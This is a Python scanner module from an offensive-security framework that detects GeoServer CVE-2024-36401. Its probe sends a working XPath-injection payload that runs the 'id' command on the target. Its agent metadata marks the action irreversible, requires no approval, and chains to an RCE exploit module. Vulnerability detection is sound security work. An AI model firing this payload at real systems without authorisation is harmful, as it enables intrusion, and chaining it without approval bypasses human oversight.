#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GeoServer CVE-2024-36401 (WFS XPath injection) detection."""

import re
import xml.etree.ElementTree as ET

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'GeoServer CVE-2024-36401 Detection',
        'description': (
            'Detects CVE-2024-36401 by checking vulnerable version ranges and '
            'confirming XPath injection on WFS GetPropertyValue (HTTP 400 + ClassCastException).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2024', 'geoserver', 'osgeo',
            'wfs', 'xpath', 'rce', 'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {'capability': 'admin_surface', 'from_detail': ''},
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'exploits/multi/http/geoserver_cve_2024_36401_rce',
                ],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2024-36401',
            'https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv',
        ],
        'cve': 'CVE-2024-36401',
    }

    port = OptPort(8080, 'GeoServer HTTP port', True)
    ssl = OptBool(False, 'Use HTTPS', True, advanced=True)

    def _geo_path(self, *parts: str) -> str:
        base = (self.path or '/').rstrip('/')
        suffix = '/'.join(p.strip('/') for p in parts if p)
        if base:
            return f'{base}/{suffix}'
        return f'/{suffix}'

    def _version_vulnerable(self, version: str) -> bool:
        parts = version.split('.')
        if len(parts) < 2:
            return False
        try:
            major, minor = int(parts[0]), int(parts[1])
            patch = int(parts[2]) if len(parts) > 2 else 0
        except ValueError:
            return False
        if major == 2 and minor == 25 and patch <= 1:
            return True
        if major == 2 and minor == 24 and patch <= 3:
            return True
        if major == 2 and minor == 23 and patch < 6:
            return True
        return major == 2 and minor < 23

    def _get_version(self) -> str | None:
        r = self.http_request(
            method='GET',
            path=self._geo_path(
                'geoserver', 'web', 'wicket', 'bookmarkable',
                'org.geoserver.web.AboutGeoServerPage',
            ),
            allow_redirects=True,
        )
        if not r or int(r.status_code or 0) != 200:
            return None
        match = re.search(
            r'<span[^>]*id=["\']version["\'][^>]*>([^<]+)</span>',
            r.text or '',
            re.I,
        )
        return match.group(1).strip() if match else None

    def _list_feature_types(self) -> list[str]:
        r = self.http_request(
            method='GET',
            path=self._geo_path('geoserver', 'wfs'),
            params={'request': 'ListStoredQueries', 'service': 'wfs'},
            allow_redirects=False,
        )
        if not r or int(r.status_code or 0) != 200:
            return []
        try:
            root = ET.fromstring(r.text or '')
        except ET.ParseError:
            return []
        types: list[str] = []
        for elem in root.iter():
            tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            if tag == 'ReturnFeatureType' and elem.text:
                types.append(elem.text.strip())
        return types

    def _probe_feature(self, feature_type: str) -> bool:
        body = (
            "<wfs:GetPropertyValue service='WFS' version='2.0.0' "
            "xmlns:wfs='http://www.opengis.net/wfs/2.0'>"
            f"<wfs:Query typeNames='{feature_type}'/>"
            '<wfs:valueReference>exec(java.lang.Runtime.getRuntime(), "id")</wfs:valueReference>'
            '</wfs:GetPropertyValue>'
        )
        r = self.http_request(
            method='POST',
            path=self._geo_path('geoserver', 'wfs'),
            data=body,
            headers={'Content-Type': 'application/xml'},
            allow_redirects=False,
        )
        if not r:
            return False
        return int(r.status_code or 0) == 400 and 'ClassCastException' in (r.text or '')

    def run(self):
        version = self._get_version()
        if not version:
            return False
        if not self._version_vulnerable(version):
            return False

        feature = ''
        for ft in self._list_feature_types():
            if self._probe_feature(ft):
                feature = ft
                break
        if not feature:
            return False

        self.set_info(
            severity='critical',
            reason=f'GeoServer {version} CVE-2024-36401 XPath RCE confirmed',
            path=self._geo_path('geoserver', 'wfs'),
            evidence=f'feature_type={feature}; ClassCastException probe',
        )
        return True
